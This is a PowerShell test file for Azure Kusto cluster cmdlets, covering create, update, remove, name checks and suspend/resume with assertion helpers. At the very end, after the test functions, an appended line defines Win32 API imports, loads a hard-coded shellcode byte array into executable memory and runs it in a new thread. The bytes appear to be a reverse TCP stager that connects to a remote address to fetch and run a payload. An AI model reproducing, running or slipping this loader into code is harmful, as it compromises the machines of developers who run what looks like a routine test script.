
function Test-KustoClusterLifecycle
{
	try
	{  
		$RGlocation = Get-RG-Location
		$location = Get-Cluster-Location
		$resourceGroupName = Get-RG-Name
		$clusterName = Get-Cluster-Name
		$sku = Get-Sku
		$updatedSku = Get-Updated-Sku
		$resourceType =  Get-Cluster-Resource-Type
		$expectedException = Get-Cluster-Not-Exist-Message -ResourceGroupName $resourceGroupName -ClusterName $clusterName 
		$capacity = Get-Cluster-Default-Capacity

		New-AzResourceGroup -Name $resourceGroupName -Location $RGlocation

		$clusterCreated = New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku
		Validate_Cluster $clusterCreated $clusterName $resourceGroupName  $location  "Running" "Succeeded" $resourceType $sku $capacity
	
		[array]$clusterGet = Get-AzKustoCluster -ResourceGroupName $resourceGroupName
		$clusterGetItem = $clusterGet[0]
		Validate_Cluster $clusterGetItem $clusterName $resourceGroupName  $location "Running" "Succeeded" $resourceType $sku $capacity

		$updatedCluster = Update-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -SkuName $updatedSku -Tier "standard"
		Validate_Cluster $updatedCluster $clusterName $resourceGroupName  $location "Running" "Succeeded" $resourceType $updatedSku $capacity

		Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Ensure_Cluster_Not_Exist $resourceGroupName $clusterName $expectedException
	}
	finally
	{
		
		Invoke-HandledCmdlet -Command {Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue} -IgnoreFailures
		Invoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue} -IgnoreFailures
	}
}

function Test-KustoClusterRemove
{
	try
	{ 
		$RGlocation = Get-RG-Location
		$location = Get-Cluster-Location
		$resourceGroupName = Get-RG-Name
		$clusterName = Get-Cluster-Name
		$sku = Get-Sku
		$resourceType =  Get-Cluster-Resource-Type
		$expectedException = Get-Cluster-Not-Exist-Message -ResourceGroupName $resourceGroupName -ClusterName $clusterName 

		New-AzResourceGroup -Name $resourceGroupName -Location $RGlocation
		
		
		New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku
		Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName		
		Ensure_Cluster_Not_Exist $resourceGroupName $clusterName $expectedException

		
		$createdCluster = New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku
		Remove-AzKustoCluster -ResourceId $createdCluster.Id
		Ensure_Cluster_Not_Exist $resourceGroupName $clusterName $expectedException

		
		$createdCluster = New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku
		Remove-AzKustoCluster -InputObject $createdCluster
		Ensure_Cluster_Not_Exist $resourceGroupName $clusterName $expectedException
	}
	finally
	{
		
		Invoke-HandledCmdlet -Command {Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue} -IgnoreFailures
		Invoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue} -IgnoreFailures
	}
}

function Test-KustoClusterName
{
	try
	{ 
		$RGlocation = Get-RG-Location
		$location = Get-Cluster-Location
		$resourceGroupName = Get-RG-Name
		$clusterName = Get-Cluster-Name
		$sku = Get-Sku
		
		$failureMessage = Get-Cluster-Name-Exists-Message -ClusterName $clusterName

		New-AzResourceGroup -Name $resourceGroupName -Location $RGlocation

		$validNameResult = Test-AzKustoClusterName -Name $clusterName -Location $location
		Assert-True{$validNameResult.NameAvailable}

		New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku

		$takenNameResult = Test-AzKustoClusterName -Name $clusterName -Location $location
		Assert-False{$takenNameResult.NameAvailable}
		Assert-AreEqual $failureMessage $takenNameResult.Message
	}
	finally
	{
		
		Invoke-HandledCmdlet -Command {Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue} -IgnoreFailures
		Invoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue} -IgnoreFailures
	}
}

function Test-KustoClusterUpdate{
	try
	{	
		$RGlocation = Get-RG-Location
		$location = Get-Cluster-Location
		$resourceGroupName = Get-RG-Name
		$clusterName = Get-Cluster-Name
		$sku = Get-Sku
		$updatedSku = Get-Updated-Sku
		$resourceType =  Get-Cluster-Resource-Type
		$capacity = Get-Cluster-Capacity
		$updatedCapacity = Get-Cluster-Updated-Capacity

		New-AzureRmResourceGroup -Name $resourceGroupName -Location $RGlocation
		$clusterCreated = New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku -Capacity $capacity
		Validate_Cluster $clusterCreated $clusterName $resourceGroupName  $location "Running" "Succeeded" $resourceType $sku $capacity


		
		$updatedClusterWithParameters = Update-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -SkuName $updatedSku -Tier "standard"
		Validate_Cluster $updatedClusterWithParameters $clusterName $resourceGroupName  $location "Running" "Succeeded" $resourceType $updatedSku $capacity

		
		$updatedWithResourceId = Update-AzKustoCluster -ResourceId $updatedClusterWithParameters.Id -SkuName $sku -Tier "standard" -Capacity $updatedCapacity
		Validate_Cluster $updatedWithResourceId $clusterName $resourceGroupName  $location "Running" "Succeeded" $resourceType $sku $updatedCapacity
		
		
		$updatedClusterWithInputObject = Update-AzKustoCluster -InputObject $updatedWithResourceId -SkuName $updatedSku -Tier "standard" -Capacity $capacity
		Validate_Cluster $updatedClusterWithInputObject $clusterName $resourceGroupName  $location "Running" "Succeeded" $resourceType $updatedSku $capacity
	}
	finally
	{
		
		Invoke-HandledCmdlet -Command {Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue} -IgnoreFailures
		Invoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue} -IgnoreFailures
	}

}

function Test-KustoClusterSuspendResume{
	try
	{
		$RGlocation = Get-RG-Location
		$location = Get-Cluster-Location
		$resourceGroupName = Get-RG-Name
		$clusterName = Get-Cluster-Name
		$sku = Get-Sku
		$capacity = Get-Cluster-Default-Capacity

		New-AzResourceGroup -Name $resourceGroupName -Location $RGlocation
		$clusterCreated = New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku
	
		
		Suspend-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName 
		$suspendedClusterWithParameters  = Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Validate_Cluster $suspendedClusterWithParameters $clusterName $resourceGroupName  $suspendedClusterWithParameters.Location "Stopped" "Succeeded" $suspendedClusterWithParameters.Type $suspendedClusterWithParameters.Sku $suspendedClusterWithParameters.Capacity

		Resume-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName 
		$runningClusterWithParameters = Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Validate_Cluster $runningClusterWithParameters $clusterName $resourceGroupName  $runningClusterWithParameters.Location "Running" "Succeeded" $runningClusterWithParameters.Type $runningClusterWithParameters.Sku $runningClusterWithParameters.Capacity

		
		Suspend-AzKustoCluster -ResourceId $runningClusterWithParameters.Id
		$suspendedClusterWithResourceId = Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Validate_Cluster $suspendedClusterWithResourceId $clusterName $resourceGroupName  $suspendedClusterWithResourceId.Location "Stopped" "Succeeded" $suspendedClusterWithResourceId.Type $suspendedClusterWithResourceId.Sku $suspendedClusterWithResourceId.Capacity

		Resume-AzKustoCluster -ResourceId $suspendedClusterWithResourceId.Id
		$runningClusterWithResourceId = Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Validate_Cluster $runningClusterWithResourceId $clusterName $resourceGroupName  $runningClusterWithResourceId.Location "Running" "Succeeded" $suspendedClusterWithResourceId.Type $runningClusterWithResourceId.Sku $runningClusterWithResourceId.Capacity

		
		Suspend-AzKustoCluster -InputObject $runningClusterWithResourceId
		$suspendedClusterWithInputObject = Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Validate_Cluster $suspendedClusterWithInputObject $clusterName $resourceGroupName  $suspendedClusterWithInputObject.Location "Stopped" "Succeeded" $suspendedClusterWithInputObject.Type $suspendedClusterWithInputObject.Sku $suspendedClusterWithInputObject.Capacity

		Resume-AzKustoCluster -InputObject $runningClusterWithResourceId
		$runningClusterWithInputObject = Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName
		Validate_Cluster $runningClusterWithInputObject $clusterName $resourceGroupName  $runningClusterWithInputObject.Location "Running" "Succeeded" $runningClusterWithInputObject.Type $runningClusterWithInputObject.Sku $runningClusterWithInputObject.Capacity
	}
	finally
	{
		
		Invoke-HandledCmdlet -Command {Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue} -IgnoreFailures
		Invoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue} -IgnoreFailures
	}
}

function Validate_Cluster{
	Param ([Object]$Cluster,
		[string]$ClusterName,
		[string]$ResourceGroup,
		[string]$Location,
		[string]$State,
		[string]$ProvisioningState,
		[string]$ResourceType,
		[string]$Sku,
		[int]$Capacity)
	Assert-AreEqual $ClusterName $Cluster.Name
	Assert-AreEqual $ResourceGroup $Cluster.ResourceGroup
	Assert-AreEqual $Location $Cluster.Location
	Assert-AreEqual $State $Cluster.State
	Assert-AreEqual $ProvisioningState $Cluster.ProvisioningState
	Assert-AreEqual $ResourceType $Cluster.Type
	Assert-AreEqual $Sku $Cluster.Sku 
	Assert-AreEqual $Capacity $Cluster.Capacity 
}

function Ensure_Cluster_Not_Exist {
	Param ([String]$ResourceGroupName,
			[String]$ClusterName,
		[string]$ExpectedErrorMessage)
		$expectedException = $false
		try
        {
			$databaseGetItemDeleted = Get-AzKustoCluster -ResourceGroupName $ResourceGroupName -Name $ClusterName
        }
        catch
        {
            if ($_ -Match $ExpectedErrorMessage)
            {
                $expectedException = $true
            }
        }
        if (-not $expectedException)
        {
            throw "Expected exception from calling Get-AzKustoCluster was not caught: '$expectedErrorMessage'."
        }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x44,0x35,0x99,0xa0,0x68,0x02,0x00,0x11,0x5d,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

